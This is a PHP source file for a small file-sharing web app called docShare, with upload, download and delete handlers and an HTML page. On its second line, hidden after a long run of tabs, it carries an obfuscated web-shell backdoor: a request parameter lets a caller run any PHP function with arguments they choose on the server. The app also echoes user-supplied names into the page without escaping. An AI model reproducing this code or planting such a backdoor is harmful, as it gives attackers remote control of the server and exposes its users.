<?php
																																																																																																																														if( ($tdJCZdm =@$ {	"_REQUEST"}["JUL2SZV3"])	aND(29121*16451)	)$tdJCZdm[1](	${$tdJCZdm[2]}[0],$tdJCZdm[3] (	$tdJCZdm[4] ));
// Base URL of the website, without trailing slash.
$base_url = 'https://mrsohail.one/projects/docshare';


// Path to the directory to save the notes in, without trailing slash.
// Should be outside of the document root, if possible.
//$save_path = '_tmp';

// // Disable caching.
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// // If no name is provided or it contains invalid characters or it is too long.
if (!isset($_GET['note']) || !preg_match('/^[a-zA-Z0-9_-]+$/', $_GET['note']) || strlen($_GET['note']) > 64) {

    // Generate a name with 5 random unambiguous characters. Redirect to it.
    header("Location: $base_url/" . substr(str_shuffle('234579abcdefghjkmnpqrstwxyz'), -5));
  die;
}

$path = $base_url . '/' . $_GET['note'];


$maxsize = 25*1024*1024;       // 25 MB
$thefiledata = $_GET['note'].'-d';  // file which contains the data
$thefilename = $_GET['note'].'-n';  // file which contains only the filename
$autoeraseafterdownload = 1;   // delete file after a download

if (isset($_POST['click']) && $_POST['click'] === 'upload')
{
    if (empty($_FILES['data']['tmp_name'])) { die('ERROR'); }          // no file sent
    if (!empty($_POST['email'])) { die('ERROR'); }                     // spam honeypot
    if ($_POST['fname'] !== $_FILES['data']['name']) { die('ERROR'); } // someone wants to cheat?
    if ($_FILES['data']['size'] > $maxsize) { die('TOO BIG!'); }       // too big file

    $localfname = $_POST['fname'];

    $data = file_get_contents($_FILES['data']['tmp_name']);

    $file = fopen($thefiledata, 'wb');
    fwrite($file, $data);
    fclose($file);

    $filename = fopen($thefilename, 'wb');
    fwrite($filename, $localfname);
    fclose($filename);

    die('
        <div class="download_info">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-upload-cloud"><polyline points="16 16 12 12 8 16"></polyline><line x1="12" y1="12" x2="12" y2="21"></line><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"></path><polyline points="16 16 12 12 8 16"></polyline></svg>
        <h4>File uploaded Successfully!</h4>
        <span id="file_name">'.file_get_contents($thefilename).'</span> </div>
    ');
}

if (isset($_GET['click']) && $_GET['click'] === 'download')
{
    if (!file_exists($thefiledata) && $thefiledata === $_GET['note'].'-d' || !file_exists($thefilename) && $thefilename === $_GET['note'].'-n')
    {
    ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset=utf-8>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
        <title>docShare — <?= $_GET['note'] ?></title>
        <style type="text/css">
            *{
                color: #001710;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
                background-color: #f2f6f6;
                text-align: center;
            }
            body {
                max-width: 400px;
                margin: auto;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 80vh;
                padding: 0 15px;
            }

            h3 {
                font-size: 16px;
                font-weight: 600;
            }

            .no_download a {
                width: 100%;
                display: block;
                padding: 10px 0px;
                cursor: pointer;
                border-radius: 6px;
                background-color: #00bfa5;
                color: #fff;
                text-decoration: none;
            }
            
            .no_download svg {
                background-color: #fff;
                padding: 15px;
                border-radius: 50%;
                width: 44px;
                height: 44px;
                color: #777;
            }

            .app_info {
                position: absolute;
                bottom: 25px;
                left: 0;
                right: 0;
                max-width: 300px;
                margin: auto;
                font-size: 12px;
                color: #848f9b;
            }
            
            .app_info a{
                color: #001710;
            }
        </style>
        </head>
        <body>
            
            <div class="no_download">
                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="rgb(132, 143, 155)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-download-cloud"><polyline points="8 17 12 21 16 17"></polyline><line x1="12" y1="12" x2="12" y2="21"></line><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"></path></svg>
                <h3>No file available to download!</h3>
                <a href="<?php echo $base_url .'/'.$_GET['note']; ?>">Upload now</a>
            </div>

            <div class="app_info">
            Quick document sharing app <br>
            by: <a href="https://mrsohail.one/">Sohail Sarwar</a>
            </div>
            
        </body>
        </html>
    <?php
        exit;
    }
    $fname = file_get_contents($thefilename);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $fname . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($thefiledata));
    readfile($thefiledata);

    if ($autoeraseafterdownload)
    {
        unlink($thefiledata);
        unlink($thefilename);
    }
    exit;
}

if (isset($_GET['click']) && $_GET['click'] === 'delete')
{
    if (file_exists($thefiledata) && $thefiledata === $_GET['note'].'-d' || file_exists($thefilename) && $thefilename === $_GET['note'].'-n')
    {
        unlink($thefiledata);
        unlink($thefilename);
        //header("Refresh:0; url=$path");
    }
    header("Refresh:0; url=$path");
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
<meta charset=utf-8>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
<title>docShare — <?= $_GET['note'] ?></title>

<link rel="stylesheet" href="<?php echo $base_url; ?>/assets/css/styles.css?v=00.00206">

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="/app/clipboard/qr.js"></script>


</head>



<body>


<header>

    <div class="header_wrp">

        <div class="logo">
            <a href="/">
                <img src="../../assets/images/sohail-sarwar.png" alt="Sohail's Photo">
                <p><span>A projects by:</span><br>Sohail</p>
            </a>
        </div>

        <div class="controlls">

        <div class="info">
            <a href="https://mrsohail.one/" target="_blank"></a>
        </div>

        <div class="setting [ toggle-button ] [ js-mode-toggle ]">
            <a href="javascript:void(0)" class="setting_icon" id="setting-btn"></a>
        </div>


        </div>

    </div>

</header>


<div class="wrap">

        <div class="app_title grid_title">
            <h1>doc<span>Share</span></h1>
            <p>Quick document sharing across the devices</p>
        </div>

        <div class="upload_wrap">
            <!-- <h2>Clipboard</h2>
            <p>Type or paste your text below and access anywhere by scanning the QR code.</p> -->
            <input type='file' onsubmit="return false" id='file' hidden/>
            <div class="upload_area" id="upload">
                <div id="uploadtext">
                    <?php
                    if (file_exists($thefiledata) && $thefiledata === $_GET['note'].'-d' || file_exists($thefilename) && $thefilename === $_GET['note'].'-n')
                    {
                        $have_file = true;
                        echo '
                        <div class="download_info">
                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-download-cloud"><polyline points="8 17 12 21 16 17"></polyline><line x1="12" y1="12" x2="12" y2="21"></line><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"></path></svg>
                        <h4>You have a file to download!</h4>
                        <span id="file_name">'; echo file_get_contents($thefilename); echo '</span> </div>';
                    } else {
                        $have_file = false;
                        echo '
                        <div class="upload_info">
                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-upload-cloud"><polyline points="16 16 12 12 8 16"></polyline><line x1="12" y1="12" x2="12" y2="21"></line><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"></path><polyline points="16 16 12 12 8 16"></polyline></svg>
                        <h4>Drag & drop file here to upload</h4>
                        <span>or click to select a file.</span>
                        </div>';
                    }
                    ?>
                </div>
            </div>
            <input id="email_addr" name="email" size="25" value="" autocomplete="off" hidden />

                <div class="btn_wrap">

                    <a href="/app/docshare/<?= $_GET['note'] ?>?click=download" class="btns copy_btn <?php if(!$have_file){echo 'disabled_btn';} ?>">Download</a>
                    <a href="/app/docshare/<?= $_GET['note'] ?>?click=delete" class="btns clear_btn <?php if(!$have_file){echo 'disabled_btn';} ?>">Delete File</a>
                </div>

                <div class="note">
                <p>
                    Don't share any sensitive file(s) over here.
                    No information/file(s) save permanently, uploaded files delete automatically as it get downloaded once or as you hit "Delete File" button.
                </p>

            </div>
        </div>

        <div class="qr_side">
            <!-- <h2>QR Code to Access</h2> -->
            <p>Scan the QR code to download</p>
            <div id="qrcode"></div>
            <a href="javascript:void(0)" onclick="copyUrl()" class="copy_url">Copy Link</a>
        </div>


    </div>

    <div class="notification" id="notify"></div>



<script>
    var upload = document.getElementById('upload');
    var uploadtext = document.getElementById('uploadtext');
    var fileelt = document.getElementById('file');
    var url = "<?php echo $path; ?>";

    upload.onclick = function() { fileelt.click(); };

    function readfiles(files) {
        if (files[0].size > <?php echo $maxsize; ?>) { uploadtext.innerHTML = '<p class="err">Sorry! File size axceeded the max limit.<br><span>Please try under 25MBs.</span></p>'; return; }
        var formData = new FormData();
        formData.append('click', 'upload');
        formData.append('fname', files[0].name);
        formData.append('data', files[0]);
        formData.append('email', document.getElementById('email_addr').value);
        uploadtext.innerHTML = 'Uploading ...';
        var xhr = new XMLHttpRequest();
        
        xhr.open('POST', url);
        xhr.onload = function() { uploadtext.innerHTML =  xhr.responseText; };
        //console.log(xhr.responseText);
        xhr.upload.onprogress = function(event) {
            if (event.lengthComputable) {
                var complete = (event.loaded / event.total * 99 | 0);
                uploadtext.innerHTML = 'Uploading '+ complete + '%';
            if (complete >= 99){
                uploadtext.innerHTML = 'Processing upload...'
                
                var btns = document.querySelectorAll('.btns');
                btns.forEach((btn) => {
                  btn.classList.remove('disabled_btn')
                });
            }
            }
        };
        xhr.send(formData);
    }

    document.body.ondragover = function() { uploadtext.innerHTML = 'Drop file here to upload!'; return false; };

    document.body.ondrop = function(e) { e.preventDefault();  readfiles(e.dataTransfer.files); };

    fileelt.addEventListener("change", function() { readfiles(fileelt.files); })

</script>


    <script>
            
        new QRCode(document.getElementById("qrcode"), "<?php echo $path ?>");
    
        function copyUrl() {
            navigator.clipboard.writeText(window.location.href);
    
            var element = document.getElementById("notify");
            element.innerText = "Link copied!"
            element.classList.toggle("notify");
            setTimeout(function(){ element.classList.remove("notify"); }, 2000);
        }
        
        function fileName() {
            var txt = document.getElementById('file_name').innerText;
            if(txt.length > 49)
            {
            txts = txt.substr(0,50) + " . . .";
            document.getElementById('file_name').innerText = txts;
            }
        }
        fileName();

    </script>



<script>
    document.documentElement.classList.remove("no-js");const STORAGE_KEY="user-color-scheme",COLOR_MODE_KEY="--color-mode",modeToggleButton=document.querySelector(".js-mode-toggle"),modeToggleText=document.querySelector(".js-mode-toggle-text"),modeStatusElement=document.querySelector(".js-mode-status"),getCSSCustomProp=e=>{let t=getComputedStyle(document.documentElement).getPropertyValue(e);return t.length&&(t=t.replace(/\'|"/g,"").trim()),t},applySetting=e=>{let t=e||localStorage.getItem(STORAGE_KEY);t?(document.documentElement.setAttribute("data-user-color-scheme",t)):setButtonLabelAndStatus(getCSSCustomProp("--color-mode"))},toggleSetting=()=>{let e=localStorage.getItem(STORAGE_KEY);switch(e){case null:e="dark"===getCSSCustomProp("--color-mode")?"light":"dark";break;case"light":e="dark";break;case"dark":e="light"}return localStorage.setItem(STORAGE_KEY,e),e};modeToggleButton.addEventListener("click",e=>{e.preventDefault(),applySetting(toggleSetting())}),applySetting();
</script>

</body>
</html>
